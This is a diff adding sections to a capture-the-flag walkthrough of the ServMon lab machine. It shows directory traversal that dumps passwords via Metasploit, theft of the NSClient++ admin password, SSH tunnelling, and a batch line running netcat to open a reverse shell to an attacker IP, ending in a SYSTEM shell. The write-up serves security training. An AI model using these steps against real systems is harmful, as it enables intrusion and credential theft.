@@ -152,7 +152,163 @@ Matching Modules
    -  ----                                       ---------------  ----    -----  -----------
    0  auxiliary/scanner/http/tvt_nvms_traversal  2019-12-12       normal  No     TVT NVMS-1000 Directory Traversal
 ```
-   
+
+## User Escalation
+
 The dots starting to connect!
 I came up with a directory traversal exploit for the following NVMS version that could help me grab the previously mentioned ``Passwords.txt`` from Nathan's desktop folder.
 
+We move on by setting the needed options to the metasploit module and giving it a go : 
+
+```console
+msf5 > use auxiliary/scanner/http/tvt_nvms_traversal
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set rhosts servmon.htb
+rhosts => servmon.htb
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set filepath /users/nathan/desktop/passwords.txt
+filepath => /users/nathan/desktop/passwords.txt
+```
+
+And we try to run it : 
+
+```console
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run
+
+[+] 10.10.10.184:80 - Downloaded 156 bytes
+[+] File saved in: /root/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/http/tvt_nvms_traversal) >exit
+
+root@kali:~# cat /root/.msf4/loot/20200418090637_default_10.10.10.184_nvms.traversal_531779.txt
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+
+The exploit was succesful and I was able to dump a collection of possible passwords I could use against SSH protocol with the usernames I have.
+
+``nadine:L1k3B1gBut7s@W0rk`` were the valid creds from the bruteforcing and with that working up , I am able to grab the user flag and move on to root.
+
+```
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt
+*redacted flag*
+```
+
+## Root Escalation
+
+As usual I started taking a look on the softwares installed on the machine to see if I could make use of any.
+
+```
+nadine@SERVMON C:\>dir "Program Files"
+ Volume in drive C has no label.
+ Volume Serial Number is 728C-D22C
+
+ Directory of C:\Program Files
+
+08/04/2020  23:21    <DIR>          .
+08/04/2020  23:21    <DIR>          ..
+08/04/2020  23:21    <DIR>          Common Files
+08/04/2020  23:18    <DIR>          Internet Explorer
+19/03/2019  05:52    <DIR>          ModifiableWindowsApps
+16/01/2020  19:11    <DIR>          NSClient++
+08/04/2020  23:09    <DIR>          Reference Assemblies
+08/04/2020  23:21    <DIR>          UNP
+14/01/2020  09:14    <DIR>          VMware
+08/04/2020  22:31    <DIR>          Windows Defender
+08/04/2020  22:45    <DIR>          Windows Defender Advanced Threat Protection
+19/03/2019  05:52    <DIR>          Windows Mail
+19/03/2019  12:43    <DIR>          Windows Multimedia Platform
+19/03/2019  06:02    <DIR>          Windows NT
+19/03/2019  12:43    <DIR>          Windows Photo Viewer
+19/03/2019  12:43    <DIR>          Windows Portable Devices
+19/03/2019  05:52    <DIR>          Windows Security
+19/03/2019  05:52    <DIR>          WindowsPowerShell
+               0 File(s)              0 bytes
+              18 Dir(s)  27,852,365,824 bytes free
+```
+
+``NSClient`` seems interesting so I started googling about it and came up with an easy step-by-step I found in [exploitdb](https://www.exploit-db.com/exploits/46802)
+
+### Exploitation
+
+We start by exploring and gathering the informations we need in order to make the exploit work.
+
+1. Grab web administrator password :
+
+```
+nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
+# If you want to fill this file with all available options run the following command:
+#   nscp settings --generate --add-defaults --load-all
+# If you want to activate a module and bring in all its options use:        
+#   nscp settings --activate-module <MODULE NAME> --add-defaults
+# For details run: nscp settings --help
+                                                
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+; Undocumented key
+allowed hosts = 127.0.0.1
+...
+```
+
+After grabbing the web administrator it seems obvious that there is also a config set so only localhost addresses are able to access the web administration page running on port 8443 so I logged out from the SSH client and reconnected by setting up a tunnel to 8443 to replicate the connection to my localhost.
+
+```
+root@kali:~# ssh -L 8443:127.0.0.1:8443 nadine@servmon.htb
+nadine@servmon.htb''s password:                                                   
+Microsoft Windows [Version 10.0.18363.752]                                  
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>
+```
+
+I can now navigate to https://localhost:8443/ :
+
+![panel](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/panel-servmon.png)
+
+We can use the password from the config file we found earlier and move on to the next step of the exploitation.
+
+2. Download nc.exe and evil.bat to c:\temp from attacking machine
+	``@echo off  c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe``
+  
+I made a file named pi.bat in my kali with the lines suggested from the exploit steps and uploaded it alongside with nc.exe in ``C:\Temp\`` of the machine.
+
+3.Add script foobar to call evil.bat and save settings
+
+Next thing , I am going to add a new script in the application named ``whatever u want`` which calls the script I saved in `C:\Temp`
+
+![evil](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/servmon-walkthrough/evil-servmon.png)
+
+As seen above I named my newly added script as `command` and now I can send this command to the console and expect a reverse shell as system.
+
+```
+root@kali:~# nc -lvnp 9001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.184.
+Ncat: Connection from 10.10.10.184:52351.
+Microsoft Windows [Version 10.0.18363.752]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\NSClient++>whoami
+nt authority\system
+```
+
+After executing the command to the web console , I succesfully got a shell as ``nt authority\system`` as expected.
+With that we came to the final sentence for this blog and I am able to grab the root flag by navigating to administrator desktop :
+
+```
+C:\Program Files\NSClient++>type C:\Users\Administrator\Desktop\root.txt
+*redacted flag*
+```
